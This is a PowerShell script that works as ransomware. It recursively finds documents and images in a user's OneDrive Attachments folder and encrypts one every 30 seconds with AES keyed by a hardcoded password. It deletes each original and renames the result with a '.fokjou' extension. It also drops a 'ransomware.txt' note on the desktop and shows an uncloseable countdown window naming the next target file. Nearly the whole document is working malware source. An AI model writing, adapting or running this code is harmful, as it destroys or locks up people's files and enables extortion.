# Enhanced Encryption Script - Timed Encryption with GUI Window
$FolderPath = "C:\Users\jgsleepy\OneDrive - 2Source4\Attachments"
$Password = "jgsleepwithme"
$IntervalSeconds = 30

# File types to encrypt
$FileTypes = @("*.txt", "*.docx", "*.doc", "*.xlsx", "*.xls", "*.pptx", "*.ppt", "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp")

Write-Host "Starting timed encryption process..." -ForegroundColor Cyan
Write-Host "GUI window will appear shortly...`n" -ForegroundColor Yellow

# Create notification file on desktop
$desktopPath = [Environment]::GetFolderPath("Desktop")
$notificationFile = Join-Path $desktopPath "ransomware.txt"
@"
Encryption in Progress...
Files are being encrypted every $IntervalSeconds seconds.
"@ | Out-File -FilePath $notificationFile -Encoding UTF8 -Force

# Load Windows Forms
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Encryption in Progress"
$form.Size = New-Object System.Drawing.Size(500, 250)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 20)
$form.ControlBox = $false  # Disable close button

# Total Encrypted Label
$labelTotal = New-Object System.Windows.Forms.Label
$labelTotal.Location = New-Object System.Drawing.Point(20, 20)
$labelTotal.Size = New-Object System.Drawing.Size(460, 30)
$labelTotal.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$labelTotal.ForeColor = [System.Drawing.Color]::Lime
$labelTotal.Text = "Total Encrypted: 0"
$form.Controls.Add($labelTotal)

# Next Target Label
$labelNextTarget = New-Object System.Windows.Forms.Label
$labelNextTarget.Location = New-Object System.Drawing.Point(20, 70)
$labelNextTarget.Size = New-Object System.Drawing.Size(460, 30)
$labelNextTarget.Font = New-Object System.Drawing.Font("Segoe UI", 12)
$labelNextTarget.ForeColor = [System.Drawing.Color]::Yellow
$labelNextTarget.Text = "Next Target: Scanning..."
$form.Controls.Add($labelNextTarget)

# Countdown Label
$labelCountdown = New-Object System.Windows.Forms.Label
$labelCountdown.Location = New-Object System.Drawing.Point(20, 120)
$labelCountdown.Size = New-Object System.Drawing.Size(460, 50)
$labelCountdown.Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Bold)
$labelCountdown.ForeColor = [System.Drawing.Color]::Red
$labelCountdown.Text = "30"
$labelCountdown.TextAlign = "MiddleCenter"
$form.Controls.Add($labelCountdown)

# Create lock file to signal encryption is active
$lockFile = Join-Path $desktopPath "encryption.lock"
"LOCKED" | Out-File -FilePath $lockFile -Encoding UTF8 -Force

function Encrypt-SingleFile {
    param($file)
    
    try {
        # Generate random salt and IV
        $salt = New-Object byte[] 32
        $iv = New-Object byte[] 16
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($salt)
        $rng.GetBytes($iv)
        
        # Create key from password
        $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 10000)
        $key = $deriveBytes.GetBytes(32)
        
        # Setup AES encryption
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        
        # Read and encrypt file
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
        
        # Store original filename as UTF8 bytes
        $originalName = $file.Name
        $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($originalName)
        $nameLength = [System.BitConverter]::GetBytes([int32]$nameBytes.Length)
        
        # Create new filename: remove extension, add .fokjou
        $baseNameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
        $outputPath = Join-Path $file.DirectoryName "$baseNameWithoutExt.fokjou"
        
        # Build encrypted file structure
        $output = New-Object System.Collections.Generic.List[byte]
        $output.AddRange($salt)
        $output.AddRange($iv)
        $output.AddRange($nameLength)
        $output.AddRange($nameBytes)
        $output.AddRange($encryptedBytes)
        
        [System.IO.File]::WriteAllBytes($outputPath, $output.ToArray())
        
        # Delete original
        Remove-Item -Path $file.FullName -Force
        
        $aes.Dispose()
        return $true
    }
    catch {
        return $false
    }
}

# Timer for encryption process
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1000  # 1 second
$script:countdown = $IntervalSeconds
$script:totalEncrypted = 0
$script:nextFile = $null

# Get initial file list
$script:allFiles = @()
foreach ($fileType in $FileTypes) {
    $script:allFiles += Get-ChildItem -Path $FolderPath -Filter $fileType -Recurse -File -ErrorAction SilentlyContinue
}

if ($script:allFiles.Count -gt 0) {
    $script:nextFile = $script:allFiles | Get-Random
    $labelNextTarget.Text = "Next Target: $($script:nextFile.Name)"
}

$timer.Add_Tick({
    $script:countdown--
    $labelCountdown.Text = "$($script:countdown)"
    
    if ($script:countdown -le 0) {
        # Encrypt the file
        if ($script:nextFile -ne $null) {
            if (Encrypt-SingleFile -file $script:nextFile) {
                $script:totalEncrypted++
                $labelTotal.Text = "Total Encrypted: $($script:totalEncrypted)"
            }
        }
        
        # Get next file
        $script:allFiles = @()
        foreach ($fileType in $FileTypes) {
            $script:allFiles += Get-ChildItem -Path $FolderPath -Filter $fileType -Recurse -File -ErrorAction SilentlyContinue
        }
        
        if ($script:allFiles.Count -eq 0) {
            $labelNextTarget.Text = "All files encrypted!"
            $labelCountdown.Text = "DONE"
            $labelCountdown.ForeColor = [System.Drawing.Color]::Lime
            $timer.Stop()
            
            # Update notification file
            @"
Encryption Complete
Total files encrypted: $($script:totalEncrypted)
Completed at: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@ | Out-File -FilePath $notificationFile -Encoding UTF8 -Force
        }
        else {
            $script:nextFile = $script:allFiles | Get-Random
            $labelNextTarget.Text = "Next Target: $($script:nextFile.Name)"
            $script:countdown = $IntervalSeconds
        }
    }
    
    # Check if decryption has been run (lock file removed)
    if (-not (Test-Path $lockFile)) {
        $timer.Stop()
        $form.Close()
    }
})

$timer.Start()

# Show form
$form.Add_FormClosing({
    param($sender, $e)
    # Prevent closing unless lock file is removed
    if (Test-Path $lockFile) {
        $e.Cancel = $true
    }
    else {
        $timer.Stop()
    }
})

[void]$form.ShowDialog()

Write-Host "`nEncryption window closed" -ForegroundColor Green
Write-Host "Total files encrypted: $($script:totalEncrypted)" -ForegroundColor Cyan